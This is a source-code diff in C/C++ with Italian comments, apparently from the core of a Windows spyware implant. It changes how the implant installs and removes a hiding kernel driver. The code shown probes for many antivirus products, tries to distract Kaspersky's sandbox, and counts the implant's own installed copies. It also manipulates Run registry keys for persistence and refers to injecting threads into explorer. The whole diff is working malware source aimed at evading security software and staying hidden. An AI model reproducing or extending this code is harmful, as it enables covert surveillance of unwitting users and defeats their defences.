@@ -315,6 +315,69 @@ DWORD HM_RemoveCoreThread(void *dummy)
 	return 1;
 }
 
+BOOL IsLastInstance()
+{
+	WCHAR first_part[MAX_PATH];
+	WCHAR second_part[MAX_PATH];
+	WCHAR search_string[MAX_PATH];
+	WCHAR complete_path[MAX_PATH];
+	WCHAR *ptr = NULL;
+	WIN32_FIND_DATAW FindFileData;
+	HANDLE hFind = INVALID_HANDLE_VALUE, hFile;
+	DWORD instances = 0;
+
+	_snwprintf_s(first_part, MAX_PATH, _TRUNCATE, L"%S", H4_HOME_PATH);
+	if (ptr = wcschr(first_part, L'\\')) {
+		ptr++;
+		if (ptr = wcschr(ptr, L'\\')) {
+			ptr++;
+			*ptr = 0;
+			ptr++;
+		}
+	}
+	if (!ptr)
+		return FALSE;
+	_snwprintf_s(search_string, MAX_PATH, _TRUNCATE, L"%s*", first_part);
+	if (!(ptr = wcschr(ptr, L'\\')))
+		return FALSE;
+	ptr++;
+	_snwprintf_s(second_part, MAX_PATH, _TRUNCATE, L"%s", ptr);
+
+	hFind = FNC(FindFirstFileW)(search_string, &FindFileData);
+	if (hFind == INVALID_HANDLE_VALUE) 
+		return FALSE;
+	
+	do {
+		// Verifica se ci sono altre directory oltre alla nostra
+		if (!(FindFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY))
+			continue;
+		_snwprintf_s(complete_path, MAX_PATH, _TRUNCATE, L"%s%s\\%s", first_part, FindFileData.cFileName, second_part);
+		
+		if ((hFile = CreateFileW(complete_path, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, 0))!=INVALID_HANDLE_VALUE) {
+			instances++;
+			CloseHandle(hFile);
+		}
+
+	} while (FNC(FindNextFileW)(hFind, &FindFileData) != 0);
+	FNC(FindClose)(hFind);
+
+	if (instances>1)
+		return FALSE;
+
+	return TRUE;
+}
+
+// Rimuove il driver dal sistema 
+void HM_RemoveDriver()
+{
+	HideDevice reg_device;
+
+	// Rimuove le chiavi nel registry
+	reg_device.unhook_uninstall();
+
+	// Cancella il file del driver
+	RemoveSystemDriver();
+}
 
 // Inietta il thread in explorer per la cancellazione
 // del core. Se explorer non e' attivo, prova a iniettare
@@ -1531,21 +1594,26 @@ void __stdcall HM_RunCore(char *cmd_line, DWORD flags, STARTUPINFO *si, PROCESS_
 	// Cerca di "distrarre" la sandbox di kaspersky
 	HIDING();
 
+	HideDevice dev_probe;
+
 	// Decide se e dove copiare il driver 
 	// (Se c'e' ZoneAlarm E ctfmon NON mette il driver)
 	if ( (IsVista(&dummy) || IsAvira() || IsDeepFreeze() || IsBlink() || IsPGuard() || /*IsKaspersky() ||*/ IsMcAfee() || IsKerio() || IsComodo2() || IsComodo3() || IsPanda() || IsTrend() || IsZoneAlarm() || IsAshampoo() || IsEndPoint())
 		 && !(IsZoneAlarm() && HM_FindPid("ctfmon.exe", TRUE)) && !IsRising() && !IsADAware() && !IsSunBeltPF() && !IsSophos32() && (!IsPCTools() || IsDeepFreeze()) && (!IsKaspersky() || IsDeepFreeze())  && (!IsFSecure() || IsDeepFreeze())) {
 		WCHAR drv_path[DLLNAMELEN*2];
+		ZeroMemory(drv_path, sizeof(drv_path));
 
 		if (!HM_GuessNames()) {
 			ReportCannotInstall();
 			return;
 		}
 
-		// Copia il driver
-		if (!CopySystemDriver(drv_path)) {
-			ReportCannotInstall();
-			return;
+		// Copia il driver (solo se non c'e' gia')
+		if (!dev_probe.unhook_isdev()) {
+			if (!CopySystemDriver(drv_path)) {
+				ReportCannotInstall();
+				return;
+			}
 		}
 
 		HideDevice dev_unhook(drv_path);
@@ -1837,12 +1905,6 @@ void HM_RemoveRegistryKey()
 	if (FNC(RegOpenKeyA) (HKEY_CURRENT_USER, "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", &hOpen) == ERROR_SUCCESS) 
 		FNC(RegDeleteValueA) (hOpen, REGISTRY_KEY_NAME);
 #endif
-}
-
-// Fa proprio quello che dice il nome
-void HM_RemoveDriver()
-{
-	UninstallDriver();
 }
 
 // Ritorna il puntatore a dopo una stringa trovata in memoria
